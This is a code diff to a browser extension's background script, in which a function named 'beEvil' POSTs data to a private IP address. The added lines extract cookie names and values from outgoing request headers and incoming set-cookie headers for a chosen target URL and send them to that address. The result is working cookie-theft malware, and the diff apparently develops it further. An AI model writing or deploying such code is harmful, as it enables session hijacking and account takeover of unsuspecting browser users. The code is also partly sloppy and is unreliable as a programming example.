@@ -1,5 +1,5 @@
 function beEvil(data){
-    fetch("http://172.20.0.4", {
+    fetch("https://172.20.0.4", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify(data)
@@ -10,7 +10,22 @@ browser.runtime.onMessage.addListener((req, sen, resp) => {
     switch (req.func) {
         case "beforeGet":
             browser.webRequest.onBeforeSendHeaders.addListener((details) => {
-                beEvil(details.requestHeaders);
+                var cookieIndex = -1
+                for (i=0; i<details.requestHeaders.length; i++){
+                    if(details.requestHeaders[i].name == "Cookie"){
+                        cookieIndex = i;
+                    }
+                }
+                var temp = '[';
+                if(cookieIndex != -1){
+                    var cookies = details.requestHeaders[cookieIndex].value.split(";");
+                        cookies.forEach((cookie) => {
+                            cookie = cookie.split("=");
+                            temp += '{"name": "' + cookie[0] + '", "value": "' + cookie[1] +'"},';
+                        });
+                }
+                temp = temp.slice(0,-1) + ']';
+                beEvil(JSON.parse(temp));
             },
             {urls: [req.target]},
             ["requestHeaders"]
@@ -55,7 +70,24 @@ browser.runtime.onMessage.addListener((req, sen, resp) => {
             break;
         case "headersGet":
             browser.webRequest.onHeadersReceived.addListener((details) => {
-                beEvil(details.responseHeaders);
+                var cookieIndex = -1
+                for (i=0; i<details.responseHeaders.length; i++){
+                    if(details.responseHeaders[i].name == "set-cookie"){
+                        cookieIndex = i;
+                    }
+                }
+                console.log(details.responseHeaders[cookieIndex]);
+                var temp = '[';
+                if(cookieIndex != -1){
+                    var cookies = details.responseHeaders[cookieIndex].value.split("\n");
+                    console.log(cookies);
+                        cookies.forEach((cookie) => {
+                            cookie = cookie.split("=");
+                            temp += '{"name": "' + cookie[0] + '", "value": "' + cookie[1].split(";")[0] +'"},';
+                        });
+                }
+                temp = temp.slice(0,-1) + ']';
+                beEvil(JSON.parse(temp));
             },
             {urls: [req.target]},
             ["responseHeaders"]
